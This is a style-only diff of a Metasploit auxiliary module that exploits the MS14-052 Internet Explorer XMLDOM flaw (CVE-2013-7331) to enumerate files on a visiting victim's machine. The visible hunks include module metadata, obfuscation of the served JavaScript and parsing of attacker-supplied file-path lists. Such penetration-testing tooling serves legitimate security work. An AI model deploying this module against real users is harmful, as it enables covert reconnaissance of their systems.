@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,39 +8,38 @@ require 'msf/core'
 require 'msf/core/exploit/jsobfu'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Exploit::JSObfu
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => "MS14-052 Microsoft Internet Explorer XMLDOM Filename Disclosure",
-      'Description'    => %q{
-        This module will use the Microsoft XMLDOM object to enumerate a remote machine's filenames.
-        It will try to do so against Internet Explorer 8 and Internet Explorer 9. To use it, you
-        must supply your own list of file paths. Each file path should look like this:
-        c:\\\\windows\\\\system32\\\\calc.exe
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Soroush Dalili', # @irsdl - Original discovery. MSF module is from his PoC
-          'sinn3r'
-        ],
-      'References'     =>
-        [
-          [ 'CVE', '2013-7331'],
-          [ 'MSB', 'MS14-052' ],
-          [ 'URL', 'https://soroush.secproject.com/blog/2013/04/microsoft-xmldom-in-ie-can-divulge-information-of-local-drivenetwork-in-error-messages/' ],
-          [ 'URL', 'https://www.alienvault.com/open-threat-exchange/blog/attackers-abusing-internet-explorer-to-enumerate-software-and-detect-securi' ]
-        ],
-      'Platform'       => 'win',
-      'Targets'        =>
-        [
-          [ 'Internet Explorer 8 / Internet Explorer 9', {} ],
-        ],
-      'DisclosureDate' => "Sep 9 2014", # MSB. Used in the wild since Feb 2014
-      'DefaultTarget'  => 0))
+                      'Name'           => "MS14-052 Microsoft Internet Explorer XMLDOM Filename Disclosure",
+                      'Description'    => %q(
+                        This module will use the Microsoft XMLDOM object to enumerate a remote machine's filenames.
+                        It will try to do so against Internet Explorer 8 and Internet Explorer 9. To use it, you
+                        must supply your own list of file paths. Each file path should look like this:
+                        c:\\\\windows\\\\system32\\\\calc.exe
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Soroush Dalili', # @irsdl - Original discovery. MSF module is from his PoC
+                          'sinn3r'
+                        ],
+                      'References'     =>
+                        [
+                          [ 'CVE', '2013-7331'],
+                          [ 'MSB', 'MS14-052' ],
+                          [ 'URL', 'https://soroush.secproject.com/blog/2013/04/microsoft-xmldom-in-ie-can-divulge-information-of-local-drivenetwork-in-error-messages/' ],
+                          [ 'URL', 'https://www.alienvault.com/open-threat-exchange/blog/attackers-abusing-internet-explorer-to-enumerate-software-and-detect-securi' ]
+                        ],
+                      'Platform'       => 'win',
+                      'Targets'        =>
+                        [
+                          [ 'Internet Explorer 8 / Internet Explorer 9', {} ]
+                        ],
+                      'DisclosureDate' => "Sep 9 2014", # MSB. Used in the wild since Feb 2014
+                      'DefaultTarget'  => 0))
 
     register_options(
       [
@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
     target_files = parse_target_files
     js_target_files = target_files * ','
 
-    %Q|
+    %|
     #{js_ajax_post}
 
     var RESULTS = {
@@ -150,7 +150,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def html
     new_js = js_obfuscate(js)
-    %Q|
+    %(
     <html>
     <head>
     </head>
@@ -160,7 +160,7 @@ class MetasploitModule < Msf::Auxiliary
     </script>
     </body>
     </html>
-    |
+    )
   end
 
   def run
@@ -181,17 +181,15 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_target_files
-    @files ||= lambda {
+    @files ||= lambda do
       files = []
       buf = ::File.open(datastore['FILES'], 'rb') { |f| buf = f.read }
       buf.each_line do |line|
-        if line =~ /^[a-z]:\\\\.+/i
-          files << "'#{line.strip}'"
-        end
+        files << "'#{line.strip}'" if line =~ /^[a-z]:\\\\.+/i
       end
 
       return files
-    }.call
+    end.call
   end
 
   def is_target_suitable?(user_agent)
@@ -217,5 +215,4 @@ class MetasploitModule < Msf::Auxiliary
       send_response(cli, html)
     end
   end
-
 end
